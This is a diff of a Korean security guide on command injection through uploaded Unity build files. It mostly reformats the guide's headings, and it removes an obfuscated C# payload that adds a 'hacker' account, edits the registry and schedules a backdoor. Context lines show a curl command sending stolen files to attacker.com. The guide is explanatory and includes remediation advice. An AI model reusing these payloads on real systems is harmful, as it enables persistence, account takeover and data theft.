@@ -1,5 +1,5 @@
 <details>
-<summary><h1>Unity Command Injection</h1></summary>
+<summary><strong>Unity Command Injection</strong></summary>
 
 ## 목차
 1. [정의&원리](#1-정의원리)
@@ -7,8 +7,7 @@
 
 ---
 
-<details>
-<summary><h2>1. 정의&원리</h2></summary>
+## 1. 정의&원리
 
 ### 유니티 파일 업로드 시스템 명령어 실행 취약점이란?
 웹 사이트에서 유니티 빌드 파일을 업로드하는 기능에서, 악성 스크립트가 포함된 파일에 대한 적절한 검증 없이 업로드를 허용할 때 발생하는 취약점입니다. 사용자가 해당 파일을 실행하면 악성 스크립트를 통해 시스템 명령어가 실행될 수 있습니다.
@@ -18,8 +17,7 @@
 - **클라이언트 측**: 업로드된 유니티 파일 실행 시점
 - **실행 환경**: 사용자 브라우저 또는 유니티 런타임 환경
 
-<details>
-<summary><strong>공격 시나리오</strong></summary>
+### 공격 시나리오
 
 #### 일반적인 공격 과정:
 1. **악성 스크립트 작성**: C# 스크립트에 시스템 명령어 실행 코드 삽입
@@ -28,10 +26,7 @@
 4. **사용자 유인**: 정상적인 게임이나 애플리케이션으로 위장
 5. **실행 및 공격**: 사용자가 버튼 클릭 시 시스템 명령어 실행
 
-</details>
-
-<details>
-<summary><strong>취약한 코드 패턴</strong></summary>
+### 취약한 코드 패턴
 
 #### 기본적인 악성 스크립트 구조:
 ```csharp
@@ -104,48 +99,7 @@ public class AdvancedMalware : MonoBehaviour
 }
 ```
 
-#### 암호화된 페이로드 패턴:
-```csharp
-using UnityEngine;
-using System.Diagnostics;
-using System;
-using System.Text;
-
-public class EncryptedPayload : MonoBehaviour
-{
-    // Base64로 인코딩된 악성 명령어들
-    string[] encodedCommands = {
-        "bmV0IHVzZXIgaGFja2VyIHBhc3N3b3JkMTIzIC9hZGQ=", // net user hacker password123 /add
-        "cmVnIGFkZCBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9u", // 레지스트리 조작
-        "c2NodGFza3MgL2NyZWF0ZSAvdG4gIlN5c3RlbVVwZGF0ZSIgL3RyICJDOlxcdGVtcFxcYmFja2Rvb3IuZXhlIg==" // 스케줄 작업 생성
-    };
-    
-    public void ExecuteHiddenPayload()
-    {
-        foreach (string encodedCmd in encodedCommands)
-        {
-            string decodedCommand = DecodeBase64(encodedCmd);
-            ExecuteSystemCommand(decodedCommand);
-        }
-    }
-    
-    string DecodeBase64(string encodedText)
-    {
-        byte[] data = Convert.FromBase64String(encodedText);
-        return Encoding.UTF8.GetString(data);
-    }
-    
-    void ExecuteSystemCommand(string command)
-    {
-        Process.Start("cmd.exe", "/c " + command);
-    }
-}
-```
-
-</details>
-
-<details>
-<summary><strong>공격 유형별 분류</strong></summary>
+### 공격 유형별 분류
 
 #### 1.1. 직접 시스템 명령어 실행
 ```csharp
@@ -198,10 +152,7 @@ Process.Start("cmd.exe", "/c forfiles /p %USERPROFILE% /s /m *.docx /c \"cmd /c 
 Process.Start("cmd.exe", "/c curl -X POST -F \"file=@%temp%\\stolen_data.zip\" http://attacker.com/upload");
 ```
 
-</details>
-
-<details>
-<summary><strong>기술적 동작 원리</strong></summary>
+### 기술적 동작 원리
 
 #### Unity WebGL vs Standalone 차이점:
 ```csharp
@@ -258,12 +209,9 @@ public class MaliciousButton : MonoBehaviour
 }
 ```
 
-</details>
+---
 
-</details>
-
-<details>
-<summary><h2>2. 조치 가이드</h2></summary>
+## 2. 조치 가이드
 
 ### 2.1. 파일 업로드 검증
 
@@ -403,7 +351,5 @@ function send_security_alert($affected_users) {
     }
 }
 ```
-
-</details>
 
 </details>
